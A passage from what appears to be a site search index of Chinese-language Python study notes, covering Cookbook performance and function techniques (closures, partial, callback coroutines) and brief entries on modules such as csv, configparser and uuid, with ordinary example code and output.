使用函数代替全局代码, 这是因为定义在全局范围的代码运行起来要比定义在函数中运行慢 的多。这种速度差异是由于局部变量和全局变量的实现方式（使用局部变量要更快些） 尽可能去掉属性访问. 每一次使用点 (.) 操作符来访问属性的时候会带来额外的开销。 它会触发特定的方法，比如 __getattribute__() 和 __getattr__() ， 这些方法会进行字典操作操作. (主要是使用导入的模块吧) 理解局部变量, 例如实例函数内, 一开始就将self.value赋值给value(局部变量) 避免不必要的抽象. 任何时候当你使用额外的处理层（比如装饰器、属性访问、描述器）去包装你的代 码时，都会让程序运行变慢。 使用内置的容器. 内置的数据类型比如字符串、元组、列表、集合和字典都是使用 C 来实现的，运 行起来非常快。如果你想自己实现新的数据结构（比如链接列表、平衡树等），那么要 想在性能上达到内置的速度几乎不可能 避免创建不必要的数据结构或复制. 讨论 在优化之前，有必要先研究下使用的算法。选择一个复杂度为 O(n log n) 的算法 要比你去调整一个复杂度为 O(n**2) 的算法所带来的性能提升要大得多。 如果你觉得你还是得进行优化，那么请从整体考虑。作为一般准则，不要对程序的 每一个部分都去优化, 因为这些修改会导致代码难以阅读和理解。你应该专注于优化产 生性能瓶颈的地方，比如内部循环。 你还要注意微小优化的结果。例如考虑下面创建一个字典的两种方式: a = {'name' : 'AAPL', 'shares' : 100, 'price' : 534.22} b = dict(name='AAPL', shares=100, price=534.22) 后面一种写法更简洁一些（你不需要在关键字上输入引号）。不过，如果你将这两 个代码片段进行性能测试对比时，会发现使用 dict() 的方式会慢了 3 倍。看到这个， 你是不是有冲动把所有使用 dict() 的代码都替换成第一种。不够，聪明的程序员只会 关注他应该关注的地方，比如内部循环。在其他地方，这点性能损失没有什么影响。 最后我引用 John Ousterhout 说过的话作为结尾：\"最好的性能优化是从不工作到 工作状态的迁移\"。直到你真的需要优化的时候再去考虑它。确保你程序正确的运行通 常比让它运行更快要更重要一些（至少开始是这样的）","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-cookbook-Test,-debug-and-abnormal.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-Test,-debug-and-abnormal.html"},{"title":"函数","text":"使用 def 语句定义函数是所有程序的基础。本章的目标是讲解一些更加高级和不 常见的函数定义与使用模式。涉及到的内容包括默认参数、任意数量参数、强制关键字 参数、注解和闭包。另外，一些高级的控制流和利用回调函数传递数据的技术在这里也 会讲解到。 可接受任意数量参数的函数 接受任意数量的位置参数, 使用 * def avg(first, *rest): return (first + sum(rest)) / (1 + len(rest)) # Sample use avg(1, 2) # 1.5 avg(1, 2, 3, 4) # 2.5 接受任意数量的关键字参数，使用一个以 ** def make_element(name, value, **attrs): ... 位置参数实际是元组 关键字参数实际是字典 一起用: def anyargs(*args, **kwargs): ... 一个 * 参数只能出现在函数定义中最后一个位置参数后面，而 ** 参数只能出现在 最后一个参数。有一点要注意的是，在 * 参数后面仍然可以定义其他参数: def a(x, *args, y): ... def b(x, *args, y, **kwargs): ... 即 强制关键字参数. 只接受关键字参数的函数 希望函数的某些参数强制使用关键字参数传递 将强制关键字参数放到某个 * 参数或者单个 * 后面就能达到这种效果: def recv(maxsize, *, block): 'Receives a message' pass recv(1024, True) # TypeError recv(1024, block=True) # Ok 给函数参数增加元信息 你写好了一个函数，然后想为这个函数的参数增加一些额外的信息，这样的话其他 使用者就能清楚的知道这个函数应该怎么使用。 使用函数参数注解: def add(x:int, y:int) -> int: return x + y python 解释器不会对这些注解添加任何的语义。它们不会被类型检查，运行时跟 没有加注解之前的效果也没有任何差距。然而，对于那些阅读源码的人来讲就很有帮助 啦。第三方工具和框架可能会对这些注解添加语义。同时它们也会出现在文档中。 函数注解只存储在函数的 __annotations__ 属性中 返回多个值的函数 函数直接 return 一个元组就行: def myfun(): return 1, 2, 3 看上去返回了多个值，实际上是先创建了一个元组然后返回的。这 个语法看上去比较奇怪，实际上我们使用的是逗号来生成一个元组，而不是用括号. 定义有默认参数的函数 定义一个函数或者方法，它的一个或多个参数是可选的并且有一个默认值 直接在函数定义中给参数指定一个默 认值，并放到参数列表最后就行了: def spam(a, b=42): print(a, b) 如果默认参数是一个可修改的容器比如一个列表、集合或者字典，可以使用 None 作为默认值: # Using a list as a default value def spam(a, b=None): if b is None: b = [] 如果你并不想提供一个默认值，而是想仅仅测试下某个默认参数是不是有传递进 来，可以像下面这样写: _no_value = object() def spam(a, b=_no_value): if b is _no_value: print('No b value supplied') 测试: >>> spam(1) No b value supplied >>> spam(1, 2) # b = 2 >>> spam(1, None) # b = None >>> 仔细观察可以发现到传递一个 None 值和不传值两种情况是有差别的。 默认参数的值仅仅在函数定义的时候赋值一次: >>> x = 42 >>> def spam(a, b=x): ... print(a, b) ... >>> spam(1) 1 42 >>> x = 23 # Has no effect >>> spam(1) 1 42 >>> 默认参数的值应该是不可变的对象，比如 None、True、False、数字或字符 串。 最后一个问题比较微妙，那就是一个函数需要测试某个可选参数是否被使用者传 递进来。这时候需要小心的是你不能用某个默认值比如 None、0 或者 False 值来测试用 户提供的值 (因为这些值都是合法的值，是可能被用户传递进来的)。因此，你需要其他 的解决方案了。 为了解决这个问题，你可以创建一个独一无二的私有对象实例，就像上面的 _no_value 变量那样。在函数里面，你可以通过检查被传递参数值跟这个实例是否一样 来判断。这里的思路是用户不可能去传递这个 _no_value 实例作为输入。因此，这里 通过检查这个值就能确定某个参数是否被传递进来了。 定义匿名或内联函数 你想为 sort() 操作创建一个很短的回调函数，但又不想用 def 去写一个单行函 数，而是希望通过某个快捷方式以内联方式来创建这个函数。 以使用 lambda 表达式: >>> add = lambda x, y: x + y >>> add(2,3) 5 >>> add('hello', 'world') 'helloworld' >>> 尽管 lambda 表达式允许你定义简单函数，但是它的使用是有限制的。你只能指定 单个表达式，它的值就是最后的返回值。也就是说不能包含其他的语言特性了，包括多 个语句、条件表达式、迭代以及异常处理等等。 匿名函数捕获变量值 用 lambda 定义了一个匿名函数，并想在定义时捕获到某些变量的值。 lambda 表达式中的 x 是一个自由变量，在运行时绑定值，而不 是定义时就绑定，这跟函数的默认值参数定义是不同的。因此，在调用这个 lambda 表 达式的时候，x 的值是执行时的值: >>> x = 10 >>> a = lambda y: x + y >>> x = 20 >>> b = lambda y: x + y >>> >>> a(10) 30 >>> b(10) 30 >>> 如果你想让某个匿名函数在定义时就捕获到值，可以将那个参数值定义成默认参 数即可，就像下面这样: >>> x = 10 >>> a = lambda y, x=x: x + y >>> x = 20 >>> b = lambda y, x=x: x + y >>> a(10) 20 >>> b(10) 30 >>> 在这里列出来的问题是新手很容易犯的错误，有些新手可能会不恰当的使用 lambda 表达式。比如，通过在一个循环或列表推导中创建一个 lambda 表达式列表，并 期望函数能在定义时就记住每次的迭代值。例如: >>> funcs = [lambda x: x+n for n in range(5)] >>> for f in funcs: ... print(f(0)) ... 4 4 4 4 4 >>> 但是实际效果是运行是 n 的值为迭代的最后一个值。现在我们用另一种方式修改 一下: >>> funcs = [lambda x, n=n: x+n for n in range(5)] >>> for f in funcs: ... print(f(0)) ... 0 1 2 3 4 >>> 通过使用函数默认值参数形式，lambda 函数在定义时就能绑定到值。 减少可调用对象的参数个数 你有一个被其他 python 代码使用的 callable 对象，可能是一个回调函数或者是一 个处理器，但是它的参数太多了，导致调用时出错。 如果需要减少某个函数的参数个数，你可以使用 functools.partial() 。partial() 函数允许你给一个或多个参数设置固定的值，减少接下来被调用时的参数个数。为了演 示清楚，假设你有下面这样的函数: def spam(a, b, c, d): print(a, b, c, d) 使用 partial() 函数来固定某些参数值: >>> from functools import partial >>> s1 = partial(spam, 1) # a = 1 >>> s1(2, 3, 4) 1 2 3 4 >>> s1(4, 5, 6) 1 4 5 6 >>> s2 = partial(spam, d=42) # d = 42 >>> s2(1, 2, 3) 1 2 3 42 >>> s2(4, 5, 5) 4 5 5 42 >>> s3 = partial(spam, 1, 2, d=42) # a = 1, b = 2, d = 42 >>> s3(3) 1 2 3 42 >>> s3(4) 1 2 4 42 >>> s3(5) 1 2 5 42 >>> 可以看出 partial() 固定某些参数并返回一个新的 callable 对象。这个新的 callable 接受未赋值的参数，然后跟之前已经赋值过的参数合并起来，最后将所有参数传递给原 始函数。 本节要解决的问题是让原本不兼容的代码可以一起工作。下面我会列举一系列的 例子。 第一个例子是，假设你有一个点的列表来表示 (x,y) 坐标元组。你可以使用下面的 函数来计算两点之间的距离: points = [ (1, 2), (3, 4), (5, 6), (7, 8) ] import math def distance(p1, p2): x1, y1 = p1 x2, y2 = p2 return math.hypot(x2 - x1, y2 - y1) 现在假设你想以某个点为基点，根据点和基点之间的距离来排序所有的这些点。列 表的 sort() 方法接受一个关键字参数来自定义排序逻辑，但是它只能接受一个单个参 数的函数 (distance() 很明显是不符合条件的)。现在我们可以通过使用 partial() 来解 决这个问题: >>> pt = (4, 3) >>> points.sort(key=partial(distance,pt)) >>> points [(3, 4), (1, 2), (5, 6), (7, 8)] >>> 将单方法的类转换为函数 有一个除 __init__() 方法外只定义了一个方法的类。为了简化代码，你想将它 转换成一个函数 大多数情况下，可以使用闭包来将单个方法的类转换成函数。举个例子，下面示例 中的类允许使用者根据某个模板方案来获取到 URL 链接地址: from urllib.request import urlopen class UrlTemplate: def __init__(self, template): self.template = template def open(self, **kwargs): return urlop 这个类可以被一个更简单的函数来代替: def urltemplate(template): def opener(**kwargs): return urlopen(template.format_map(kwargs)) return opener 大部分情况下，你拥有一个单方法类的原因是需要存储某些额外的状态来给方法 使用。比如，定义 UrlTemplate 类的唯一目的就是先在某个地方存储模板值，以便将来 可以在 open() 方法中使用。 使用一个内部函数或者闭包的方案通常会更优雅一些。简单来讲，一个闭包就是 一个函数，只不过在函数内部带上了一个额外的变量环境。闭包关键特点就是它会记 住自己被定义时的环境。因此，在我们的解决方案中，opener() 函数记住了 template 参数的值，并在接下来的调用中使用它。 任何时候只要你碰到需要给某个函数增加额外的状态信息的问题，都可以考虑使 用闭包。相比将你的函数转换成一个类而言，闭包通常是一种更加简洁和优雅的方案。 带额外状态信息的回调函数 你的代码中需要依赖到回调函数的使用 (比如事件处理器、等待后台任务完成后的 回调等)，并且你还需要让回调函数拥有额外的状态值，以便在它的内部使用到。 主要讨论的是那些出现在很多函数库和框架中的回调函数的使用——特 别是跟异步处理有关的。为了演示与测试，我们先定义如下一个需要调用回调函数的函 数: def apply_async(func, args, *, callback): # Compute the result result = func(*args) # Invoke the callback with the result callback(result) 使用: >>> def print_result(result): ... print('Got:', result) ... >>> def add(x, y): ... return x + y ... >>> apply_async(add, (2, 3), callback=print_result) Got: 5 >>> apply_async(add, ('hello', 'world'), callback=print_result) Got: helloworld >>> 使用一个闭包捕获状态值: def make_handler(): sequence = 0 def handler(result): nonlocal sequence sequence += 1 print('[{}] Got: {}'.format(sequence, result)) return handler 使用: >>> handler = make_handler() >>> apply_async(add, (2, 3), callback=handler) [1] Got: 5 >>> apply_async(add, ('hello', 'world'), callback=handler) [2] Got: helloworld >>> 还有另外一个更高级的方法，可以使用协程来完成同样的事情: def make_handler(): sequence = 0 while True: result = yield sequence += 1 print('[{}] Got: {}'.format(sequence, result)) 对于协程，你需要使用它的 send() 方法作为回调函数，如下所示: >>> handler = make_handler() >>> next(handler) # Advance to the yield >>> apply_async(add, (2, 3), callback=handler.send) [1] Got: 5 >>> apply_async(add, ('hello', 'world'), callback=handler.send) [2] Got: helloworld >>> 基于回调函数的软件通常都有可能变得非常复杂。一部分原因是回调函数通常会 跟请求执行代码断开。因此，请求执行和处理结果之间的执行环境实际上已经丢失了。 如果你想让回调函数连续执行多步操作，那你就必须去解决如何保存和恢复相关的状 态信息了。 至少有两种主要方式来捕获和保存状态信息，你可以在一个对象实例 (通过一个绑 定方法) 或者在一个闭包中保存它。两种方式相比，闭包或许是更加轻量级和自然一点， 因为它们可以很简单的通过函数来构造。它们还能自动捕获所有被使用到的变量。因 此，你无需去担心如何去存储额外的状态信息 (代码中自动判定)。 如果使用闭包，你需要注意对那些可修改变量的操作。在上面的方案中，nonlocal 声明语句用来指示接下来的变量会在回调函数中被修改。如果没有这个声明，代码会报 错 而使用一个协程来作为一个回调函数就更有趣了，它跟闭包方法密切相关。某种意 义上来讲，它显得更加简洁，因为总共就一个函数而已。并且，你可以很自由的修改变 量而无需去使用 nonlocal 声明。这种方式唯一缺点就是相对于其他 Python 技术而言 或许比较难以理解。另外还有一些比较难懂的部分，比如使用之前需要调用 next() ， 实际使用时这个步骤很容易被忘记。尽管如此，协程还有其他用处，比如作为一个内联 回调函数的定义 如果你仅仅只需要给回调函数传递额外的值的话，还有一种使用 partial() 的方 式也很有用。在没有使用 partial() 的时候，你可能经常看到下面这种使用 lambda 表 达式的复杂代码: >>> apply_async(add, (2, 3), callback=lambda r: handler(r, seq)) [1] Got: 5 >>> 内联回调函数 当你编写使用回调函数的代码的时候，担心很多小函数的扩张可能会弄乱程序控 制流。你希望找到某个方法来让代码看上去更像是一个普通的执行序列。 通过使用生成器和协程可以使得回调函数内联在某个函数中 假设你有如下所示的一个执行某种计算任务然后调用一个回调函数的函数: def apply_async(func, args, *, callback): # Compute the result result = func(*args) # Invoke the callback with the result callback(result) 接下来让我们看一下下面的代码，它包含了一个 Async 类和一个 inlined_async 装饰器: from queue import Queue from functools import wraps class Async: def __init__(self, func, args): self.func = func self.args = args def inlined_async(func): @wraps(func) def wrapper(*args): f = func(*args) result_queue = Queue() result_queue.put(None) while True: result = result_queue.get() try: a = f.send(result) apply_async(a.func, a.args, callback=result_queue.put) except StopIteration: break return wrapper 这两个代码片段允许你使用 yield 语句内联回调步骤。比如: def add(x, y): return x + y @inlined_async def test(): r = yield Async(add, (2, 3)) print(r) r = yield Async(add, ('hello', 'world')) print(r) for n in range(10): r = yield Async(add, (n, n)) print(r) print('Goodbye') 如果你调用 test() ，你会得到类似如下的输出: 5 helloworld 0 2468 10 12 14 16 18 Goodbye 你会发现，除了那个特别的装饰器和 yield 语句外，其他地方并没有出现任何的 回调函数 (其实是在后台定义的) 关于回调函数、生成器和控制流 在需要使用到回调的代码中，关键点在于当前计算工作会挂起并在将来 的某个时候重启 (比如异步执行)。当计算重启时，回调函数被调用来继续处理结果。 apply_async() 函数演示了执行回调的实际逻辑，尽管实际情况中它可能会更加复杂 (包括线程、进程、事件处理器等等)。 计算的暂停与重启思路跟生成器函数的执行模型不谋而合。具体来讲，yield 操作 会使一个生成器函数产生一个值并暂停。接下来调用生成器的 __next__() 或 send() 方法又会让它从暂停处继续执行。 访问闭包中定义的变量 想要扩展函数中的某个闭包，允许它能访问和修改函数的内部变量 通常来讲，闭包的内部变量对于外界来讲是完全隐藏的。但是，你可以通过编写访 问函数并将其作为函数属性绑定到闭包上来实现这个目的。例如: def sample(): n = 0 # Closure function def func(): print('n=', n) # Accessor methods for n def get_n(): return n def set_n(value): nonlocal n n = value # Attach as function attributes func.get_n = get_n func.set_n = set_n return func 使用: >>> f = sample() >>> f() n= 0 >>> f.set_n(10) >>> f() n= 10 >>> f.get_n() 10 >>> 为了说明清楚它如何工作的，有两点需要解释一下。首先，nonlocal 声明可以让 我们编写函数来修改内部变量的值。其次，函数属性允许我们用一种很简单的方式将访 问方法绑定到闭包函数上，这个跟实例方法很像 (尽管并没有定义任何类)。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-cookbook-function.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-function.html"},{"title":"分类","text":"模版校验 /docs/后端/python/python标准库/configparser 网络编程 /docs/后端/python/python标准库/socket /docs/后端/python/python标准库/socketserver /docs/后端/python/python标准库/ssl","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-.Classification.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-.Classification.html"},{"title":"bdb","text":"官网: https://docs.python.org/zh-cn/3/library/bdb.html 调试器框架. 模块处理基本的调试器函数，例如设置断点或通过调试器来管理执行。 简单介绍部分","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-BDB.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-BDB.html"},{"title":"csv","text":"官网: csv - CSV 文件读写 CSV (Comma Separated Values) 格式是电子表格和数据库中最常见的输入、输出文件格式。 csv 模块实现了 CSV 格式表单数据的读写。 其提供了诸如\"以兼容 Excel 的方式输出数据文件\"或\"读取 Excel 程序输出的数据文件\"的功能， 程序员无需知道 Excel 所采用 CSV 格式的细节。 此模块同样可以用于定义其他应用程序可用的 CSV 格式或定义特定需求的 CSV 格式。 csv 模块中的 reader 类和 writer 类可用于读写序列化的数据。 也可使用 DictReader 类和 DictWriter 类以字典的形式读写数据。 提供的函数 提供的类 DictReader DictWriter Dialect excel excel_tab unix_dialect Sniffer DictReader DictWriter Dialect excel excel_tab unix_dialect Sniffer 提供的常量 csv.QUOTE_ALL: 指示 writer 对象给所有字段加上引号。 csv.QUOTE_MINIMAL: 指示 writer 对象仅为包含特殊字符（例如 定界符、引号字符 或 行结束符 中的任何字符）的字段加上引号。 csv.QUOTE_NONNUMERIC: 指示 writer 对象为所有非数字字段加上引号。 指示 reader 将所有未用引号引出的字段转换为 float 类型。 csv.QUOTE_NONE: 指示 writer 对象不使用引号引出字段。 当 定界符 出现在输出数据中时，其前面应该有 转义符。 如果未设置 转义符，则遇到任何需要转义的字符时，writer 都会抛出 Error 异常。 指示 reader 不对引号字符进行特殊处理。 变种与格式参数 为了更容易指定输入和输出记录的格式, 特定的一组格式参数组合为一个 dialect（变种） 一个 dialect 是一个 Dialect 类的子类， 它具有一组特定的方法和一个 validate() 方法。 创建 reader 或 writer 对象时，程序员可以将某个字符串或 Dialect 类的子类指定为 dialect 参数。 要想补充或覆盖 dialect 参数，程序员还可以单独指定某些格式参数，这些参数的名称与下面 Dialect 类定义的属性相同。 Dialect支持属性 Dialect 类支持以下属性: Dialect.delimiter: 一个用于分隔字段的单字符，默认为 ','。 Dialect.doublequote: 控制出现在字段中的 引号字符 本身应如何被引出。 当该属性为 True 时，双写引号字符。 如果该属性为 False，则在 引号字符 的前面放置 转义符。默认值为 True。 在输出时，如果 doublequote 是 False，且 转义符 未指定，且在字段中发现 引号字符 时，会抛出 Error 异常。 Dialect.escapechar: 一个用于 writer 的单字符，用来在 quoting 设置为 QUOTE_NONE 的情况下转义 定界符， 在 doublequote 设置为 False 的情况下转义 引号字符。 在读取时，escapechar 去除了其后所跟字符的任何特殊含义。该属性默认为 None，表示禁用转义。 在 3.11 版更改: An empty escapechar is not allowed. Dialect.lineterminator: 放在 writer 产生的行的结尾，默认为 'rn'。 备注 reader 经过硬编码，会识别 'r' 或 'n' 作为行尾，并忽略 lineterminator。未来可能会更改这一行为。 Dialect.quotechar: 一个单字符，用于包住含有特殊字符的字段，特殊字符如 定界符 或 引号字符 或换行符。默认为 '\"'。 在 3.11 版更改: An empty quotechar is not allowed. Dialect.quoting: 控制 writer 何时生成引号，以及 reader 何时识别引号。 该属性可以等于任何 QUOTE_* 常量（参见 模块内容 段落），默认为 QUOTE_MINIMAL。 Dialect.skipinitialspace: When True, spaces immediately following the delimiter are ignored. The default is False. Dialect.strict: 如果为 True，则在输入错误的 CSV 时抛出 Error 异常。默认值为 False。 Reader 对象 Reader 对象 ( DictReader 实例和 reader() 函数返回的对象) 具有以下公开方法： Reader 对象具有以下公开属性： csvreader.dialect: 变种描述，只读，供解析器使用。 csvreader.line_num: 源迭代器已经读取了的行数。它与返回的记录数不同，因为记录可能跨越多行。 DictReader 对象具有以下公开属性： DictReader.fieldnames: 字段名称。如果在创建对象时未传入字段名称，则首次访问时或从文件中读取第一条记录时会初始化此属性。 Writer 对象 Writer 对象（DictWriter 实例和 writer() 函数返回的对象）具有下面的公开方法。 对于 Writer 对象，行 必须是（一组可迭代的）字符串或数字。 对于 DictWriter 对象，行 必须是一个字典，这个字典将字段名映射为字符串或数字（数字要先经过 str() 转换类型）。 请注意，输出的复数会有括号包围。这样其他程序读取 CSV 文件时可能会有一些问题（假设它们完全支持复数）。 Writer 对象具有以下公开属性： csvwriter.dialect: 变种描述，只读，供 writer 使用。 DictWriter 对象具有以下公开方法：","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-CSV.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-CSV.html"},{"title":"configparser","text":"介绍 configparser 模块主要是用来读写配置文件的, 比如 ini 类型的文件. 读取结果以节的形式展示, 每一个节下含选项字典 用例 [default] a = 1 b = 2 c = 3 [dev] a = 11 b = 22 c = 33 [test] a = 111 b = 222 c = 333 # coding: utf-8 # # Copyright (C) 2022-2022, Inc. All Rights Reserved # # @Time : 2022/12/14 下午1:41 # @Author : yan que # @Email : yanquer@qq.com # @File : t_configparser.py # @Project : mytest import configparser from typing import Dict , List class MyConfig ( object ): _config_path : str _config_parser = configparser . ConfigParser () def _write_file ( self ): with open ( self . _config_path , 'w' ) as f : self . _config_parser . write ( f ) def save ( self ): self . _write_file () def _read_file ( self ): self . _config_parser . read ( self . _config_path , encoding = 'utf-8' ) def __init__ ( self , config_path : str ): self . _config_path = config_path self . _read_file () @property def config_parser ( self ): return self . _config_parser @property def selections ( self ): return self . _config_parser . sections () def has_selection ( self , name : str ): return self . _config_parser . has_section ( name ) def has_option ( self , selection : str , option : str ): return self . _config_parser . has_option ( selection , option ) def add_selection ( self , name : str ): if not self . has_selection ( name ): self . _config_parser . add_section ( name ) def add_options ( self , selection : str , data : Dict [ str , str ]): if self . has_selection ( selection ): for k , v in data . items (): self . _config_parser . set ( selection , k , v ) def remove_selection ( self , name : str ): self . _config_parser . remove_section ( name ) def remove_option ( self , selection : str , data : List [ str ]): if self . has_selection ( selection ): for option in data : self . _config_parser . remove_option ( selection , option ) def main (): my_config = MyConfig ( config_path = './setting.ini' ) # 获取所有的节 print ( '获取所有的节' , my_config . selections ) # 判断是否存在 dev 节 print ( '判断是否存在 dev 节' , my_config . has_selection ( 'dev' )) # 判断是否存在 tt 节 print ( '判断是否存在 tt 节' , my_config . has_selection ( 'tt' )) # 判断 dev 节是否存在 a 选项 print ( '判断 dev 节是否存在 a 选项' , my_config . has_option ( 'dev' , 'a' )) # 判断 dev 节是否存在 aa 选项 print ( '判断 dev 节是否存在 aa 选项' , my_config . has_option ( 'dev' , 'aa' )) # 添加一个 tt 节 print ( '添加一个 tt 节' , my_config . add_selection ( 'tt' ), my_config . selections ) # tt节添加选项 my_config . add_options ( 'tt' , { 'a' : '123' , 'b' : '123' , 'c' : '123' , }) # 读取一个节 print ( '读取 dev 节所有选项' , my_config . config_parser . options ( 'dev' )) # 读取一个节的某个选项 print ( '读取 dev 节 a 选项' , my_config . config_parser . get ( 'dev' , 'a' )) print ( '读取 dev 节 a 选项' , my_config . config_parser . getint ( 'dev' , 'a' )) # 读取一个节所有配置 print ( '读取 dev 节所有配置' , my_config . config_parser . items ( 'dev' )) # 支持直接以字典的形式写入 my_config . config_parser [ 'DEFAULT' ] = { 'ServerAliveInterval' : '45' , 'Compression' : 'yes' , 'CompressionLevel' : '9' } # 保存, 只有保存才会持久化写入到硬盘 my_config . save () 获取所有的节 ['default', 'dev', 'test', 'tt'] 判断是否存在 dev 节 True 判断是否存在 tt 节 True 判断 dev 节是否存在 a 选项 True 判断 dev 节是否存在 aa 选项 False 添加一个 tt 节 None ['default', 'dev', 'test', 'tt'] 读取 dev 节所有选项 ['a', 'b', 'c'] 读取 dev 节 a 选项 11 读取 dev 节 a 选项 11 读取 dev 节所有配置 [('a', '11'), ('b', '22'), ('c', '33')] [DEFAULT] serveraliveinterval = 45 compression = yes compressionlevel = 9 [default] a = 1 b = 2 c = 3 [dev] a = 11 b = 22 c = 33 [test] a = 111 b = 222 c = 333 [tt] a = 123 b = 123 c = 123","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-ConfigParser.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-ConfigParser.html"},{"title":"glob","text":"glob --- Unix 风格路径名模式扩展 官网: https://docs.python.org/zh-cn/3/library/glob.html glob 模块会按照 Unix shell 所使用的规则找出所有匹配特定模式的路径名称，但返回结果的顺序是不确定的。 波浪号扩展不会生效，但*, ? 以及用 [] 表示的字符范围将被正确地匹配。 这是通过配合使用 os.scandir() 和 fnmatch.fnmatch() 函数来实现的，而不是通过实际发起调用子 shell。 3.4 新版功能.","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-Glob.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-Glob.html"},{"title":"hmac","text":"官网: https://docs.python.org/zh-cn/3/library/hmac.html 基于密钥的消息验证 此模块实现了 HMAC 算法，算法的描述参见 RFC 2104。 常用两个API","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-HMAC.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-HMAC.html"},{"title":"pip","text":"一个三方包管理器. 在Ubuntu这种系统上, 可能没有预装需要手动安装: apt install python3-pip -y 查看获取配置文件的位置: pip -v config list","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-PIP.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-PIP.html"},{"title":"secrets","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-Secrets.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-Secrets.html"},{"title":"textwrap","text":"官网: textwrap --- 文本自动换行与填充 textwrap 模块提供了一些快捷函数，以及可以完成所有工作的类 TextWrapper。 如果你只是要对一两个文本字符串进行自动换行或填充，快捷函数应该就够用了；否则，应该使用 TextWrapper 的实例来提高效率。 快捷函数 wrap fill shorten dedent wrap fill shorten dedent indent wrap(), fill() 和 shorten() 的作用方式为创建一个 TextWrapper 实例并在其上调用单个方法。 该实例不会被重用，因此对于要使用 wrap() 和/或 fill() 来处理许多文本字符串的应用来说， 创建你自己的 TextWrapper 对象可能会更有效率。 文本最好在空白符位置自动换行，包括带连字符单词的连字符之后； 长单词仅在必要时会被拆分，除非 TextWrapper.break_long_words 被设为假值。 TextWrapper TextWrapper 类","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-Textwrap.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-Textwrap.html"},{"title":"uuid","text":"官网文档:: uuid RFC 4122 定义的UUID对象 提供了不可变的 UUID 对象 (UUID 类) 以及: uuid1 , uuid3 , uuid4 , uuid5 等函数用于生成 RFC 4122 所定义的第 1, 3, 4 和 5 版 UUID. 使用方面: Python中没有基于DCE的，所以uuid2可以忽略； uuid4存在概率性重复，由无映射性，最好不用； 若在Global的分布式计算环境下，最好用uuid1； 若有名字的唯一性要求，最好用uuid3或uuid5。 主要的类 SafeUUID 具有的只读属性 UUID.bytes UUID是一个16字节的字符串（包含6个大端字节序的整数字段）. UUID.bytes_le UUID 是一个 16 字节的字符串（其中 time_low、time_mid 和 time_hi_version 为小端字节顺序）. UUID.fields 以元组形式存放的UUID的6个整数域，有六个单独的属性和两个派生属性： 域 含意 time_low UUID的前32位 time_mid 接前一域的16位 time_hi_version 接前一域的16位 clock_seq_hi_variant 接前一域的8位 clock_seq_low 接前一域的8位 node UUID的最后48位 time UUID的总长60位的时间戳 clock_seq 14位的序列号 UUID.hex UUID 是一个 32 字符的小写十六进制数码字符串. 与直接 str 转换的效果类似: a = uuid.uuid4() a Out[10]: UUID('a7de0199-3e5e-4d84-8fd3-5f65052db9b5') # convert a UUID to a string of hex digits in standard form str(a) Out[11]: 'a7de0199-3e5e-4d84-8fd3-5f65052db9b5' a.hex Out[12]: 'a7de01993e5e4d848fd35f65052db9b5' UUID.int UUID是一个128位的整数. UUID.urn 在 RFC 4122 中定义的 URN 形式的 UUID. UUID.variant UUID 的变体，它决定了 UUID 的内部布局. 这将是 RESERVED_NCS , RFC_4122 , RESERVED_MICROSOFT 或 RESERVED_FUTURE 中的一个. UUID.version UUID 版本号（1 到 5，只有当变体为 RFC_4122 时才有意义）. UUID.is_safe 一个 SafeUUID 的枚举，表示平台是否以多进程安全的方式生成 UUID. 模块函数 uuid.getnode() 获取 48 位正整数形式的硬件地址. 第一次运行时，它可能会启动一个单独的程序，这可能会相当慢. 如果所有获取硬件地址的尝试都失败了，我们会按照 RFC 4122 中的建议，选择一个随机的 48 位数字， 其多播位 (第一个八进制数的最小有效位) 设置为 1. \"硬件地址\"是指一个网络接口的 MAC 地址. 在一台有多个网络接口的机器上， 普遍管理的 MAC 地址 (即第一个八位数的第二个最小有效位是 未设置的) 将比本地管理的 MAC 地址优先，但没有其他排序保证. 在 3.7 版更改: 普遍管理的MAC地址优于本地管理的MAC地址，因为前者保证是全球唯一的，而后者则不是. uuid.uuid1(node=None, clock_seq=None) 基于时间戳 根据主机 ID、序列号和当前时间生成一个 UUID. 如果没有给出 node，则使用 getnode() 来获取硬件地址(MAC地址), 虽然保证了全球的唯一, 但会有安全问题(MAC地址唯一). 所以局域网中 node 可以使用 ip 地址. 如果给出了 clock_seq，它将被用作序列号；否则将选择一个随机的 14 比特位序列号. uuid.uuid3(namespace, name) 基于名字的MD5散列值 根据命名空间标识符（这是一个UUID）和名称（这是一个字符串）的MD5哈希值，生成一个UUID. uuid.uuid4() 基于随机数 生成一个随机的UUID. 由伪随机数得到，有一定的重复概率，该概率可以计算出来。 uuid.uuid5(namespace, name) 基于名字的SHA-1散列值 与uuid3类似, 根据命名空间标识符（这是一个UUID）和名称（这是一个字符串）的SHA-1哈希值生成一个UUID. 注解 其实还有一个uuid2, 基于分布式计算环境DCE, 不过python没有 算法与uuid1相同，不同的是把时间戳的前4位置换为POSIX的UID。实际中很少用到该方法。 命名空间标识符 uuid 模块定义了以下命名空间标识符，供 uuid3() 或 uuid5() 使用. uuid.NAMESPACE_DNS 当指定 namespace 为此值时, name值为域名(domain name) uuid.NAMESPACE_URL 当指定这个命名空间时，name 字符串是一个 URL. uuid.NAMESPACE_OID 当指定这个命名空间时，name 字符串是一个 ISO 